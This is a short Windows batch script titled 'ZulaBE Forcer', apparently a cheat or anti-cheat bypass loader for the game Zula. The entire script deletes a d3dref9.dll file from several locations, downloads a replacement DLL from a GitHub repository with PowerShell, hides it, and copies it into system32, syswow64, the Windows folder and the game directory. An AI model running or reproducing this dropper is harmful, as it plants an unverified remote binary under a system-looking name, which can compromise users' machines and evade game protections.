@echo off
echo off
cls

title ZulaBE Forcer

del /f /q /a %windir%\system32\d3dref9.dll
del /f /q /a %windir%\syswow64\d3dref9.dll
del /f /q /a %windir%\d3dref9.dll
del /f /q /a %systemdrive%\Zula\Game\d3dref9.dll

@powershell wget https://github.com/coolestdaemon/babannem/raw/refs/heads/main/d3dref9.dll -OutFile d3dref9.dll
@powershell Invoke-WebRequest -Uri "https://github.com/coolestdaemon/babannem/raw/refs/heads/main/d3dref9.dll" -OutFile "%systemdrive%\d3dref9.dll"
attrib +h "%systemdrive%\d3dref9.dll"
copy %systemdrive%\d3dref9.dll %systemdrive%\Zula\Game\d3dref9.dll
copy %systemdrive%\d3dref9.dll %windir%\system32\d3dref9.dll
copy %systemdrive%\d3dref9.dll %windir%\syswow64\d3dref9.dll
copy %systemdrive%\d3dref9.dll %windir%\isim.dll
ren %systemdrive%\windows\isim.dll d3dref9.dll

pause .